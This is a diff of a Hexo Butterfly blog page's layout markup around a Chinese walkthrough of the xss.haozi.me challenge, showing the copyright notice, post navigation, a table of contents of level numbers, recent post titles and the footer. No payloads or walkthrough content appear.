-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://rdyx0.github.io">儒道易行</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://rdyx0.github.io/2019/10/20/xss.haozi.me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">http://rdyx0.github.io/2019/10/20/xss.haozi.me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://rdyx0.github.io" target="_blank">儒道易行</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/fluid.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/21/XSS%20Challenges%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"><img class="prev-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS Challenges通关教程</div></div></a></div><div class="next-post pull-right"><a href="/2019/10/19/DSVW%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"><img class="next-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DSVW通关教程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/fluid.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">儒道易行</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/rdyx0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">谢天谢地、不忘祖先、敬畏圣贤</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#10-xss-haozi-me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">10.xss.haozi.me通关教程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">1.3.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">1.4.</span> <span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-number">1.5.</span> <span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-number">1.6.</span> <span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-number">1.7.</span> <span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07"><span class="toc-number">1.8.</span> <span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08"><span class="toc-number">1.9.</span> <span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09"><span class="toc-number">1.10.</span> <span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A"><span class="toc-number">1.11.</span> <span class="toc-text">0x0A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B"><span class="toc-number">1.12.</span> <span class="toc-text">0x0B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C"><span class="toc-number">1.13.</span> <span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D"><span class="toc-number">1.14.</span> <span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E"><span class="toc-number">1.15.</span> <span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F"><span class="toc-number">1.16.</span> <span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10"><span class="toc-number">1.17.</span> <span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11"><span class="toc-number">1.18.</span> <span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12"><span class="toc-number">1.19.</span> <span class="toc-text">0x12</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2019/10/24/Webug4.0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="Webug4.0靶场通关">Webug4.0靶场通关</a><time datetime="2019-10-24T13:36:15.000Z" title="发表于 2019-10-24 21:36:15">2019-10-24</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2019/10/23/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91xss%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="独孤九剑xss通关教程">独孤九剑xss通关教程</a><time datetime="2019-10-23T13:36:15.000Z" title="发表于 2019-10-23 21:36:15">2019-10-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2019/10/22/XSS%20Game%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="XSS Game通关教程">XSS Game通关教程</a><time datetime="2019-10-22T13:36:15.000Z" title="发表于 2019-10-22 21:36:15">2019-10-22</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2019/10/21/XSS%20Challenges%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="XSS Challenges通关教程">XSS Challenges通关教程</a><time datetime="2019-10-21T13:36:15.000Z" title="发表于 2019-10-21 21:36:15">2019-10-21</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2019/10/20/xss.haozi.me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="xss.haozi.me通关教程">xss.haozi.me通关教程</a><time datetime="2019-10-20T13:36:15.000Z" title="发表于 2019-10-20 21:36:15">2019-10-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 儒道易行</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
